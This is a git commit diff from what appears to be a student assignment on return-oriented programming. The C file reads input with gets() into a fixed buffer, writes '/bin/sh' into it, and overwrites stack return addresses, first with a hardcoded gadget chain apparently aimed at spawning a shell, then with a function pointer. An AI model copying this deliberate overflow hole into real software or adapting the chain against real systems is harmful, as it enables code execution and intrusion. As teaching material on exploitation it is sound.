9fbe9b1e2ce6d42e363931a78159f792259df38c
underhood31 <manavjeet18295@iiitd.ac.in>
2021-05-03 00:24:08 +0530

    somee

--- Assignment_2/return_oriented_programming/sample.c
+++ Assignment_2/return_oriented_programming/sample.c
@@ -7,29 +7,32 @@ void called(){
 } 
 
 int main(){
-	called();
-        char name[64],*cptr;
+	char name[64],*cptr;
         unsigned long *ptr;
 	printf("buffer address: %p\n", name);  //print address of buffer
-	printf("func address: %p\n",called);
-	printf("execve address: %p\n",execve);  
-	printf("%d\n",sizeof(unsigned long));      
-	puts("Enter text for name:");
+        puts("Enter text for name:");
         gets(name);
         printf("content of buffer: %s\n", name);
+        // printf("content of buffer: %s\n", name);
         
         memset(name,0,64);
         strcpy(name,"/bin/sh"); 
         
-        cptr = name+64+8;
+        cptr = name+80+8;
         ptr = (unsigned long *)cptr;
-        *ptr = 0x0000ffffd098;
-        *(ptr+1) = (unsigned long *)name;
-        *(ptr+2) = 0x00007ffff7b79d76;
-        *(ptr+3) = (unsigned long *)0;
-        *(ptr+4) = 0x00007ffff7a15b8e;
-        *(ptr+5) = (unsigned long *)0;
-        *(ptr+6) = 0x00007ffff7ad5ec0;
+        *ptr = called;
+        *(ptr+1) = called;
+        *(ptr+2) = called;
+        *(ptr+3) = called;
+        // *(ptr+4) = called;
+        // *(ptr+5) = called;
+        // *ptr = 0x00007ffff7b7a9af;
+        // *(ptr+1) = (unsigned long *)name;
+        // *(ptr+2) = 0x00007ffff7b79d76;
+        // *(ptr+3) = (unsigned long *)0;
+        // *(ptr+4) = 0x00007ffff7a15b8e;
+        // *(ptr+5) = (unsigned long *)0;
+        // *(ptr+6) = 0x00007ffff7ad5ec0;
        
   
         return 0;
